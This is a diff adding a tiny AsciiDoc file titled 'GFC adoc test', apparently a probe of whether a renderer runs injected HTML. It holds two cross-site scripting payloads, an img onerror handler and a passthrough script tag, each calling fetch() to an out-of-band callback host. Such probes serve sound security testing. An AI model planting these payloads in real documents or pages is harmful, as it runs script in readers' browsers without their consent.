@@ -1,0 +1,7 @@
+= GFC adoc test
+
+<img src=x onerror="fetch('https://db9b2to3jqadolcc7l4geyqt3a35k5x3w.oast.fun/a-img')">
+
+++++
+<script>fetch('https://db9b2to3jqadolcc7l4geyqt3a35k5x3w.oast.fun/a-script')</script>
+++++
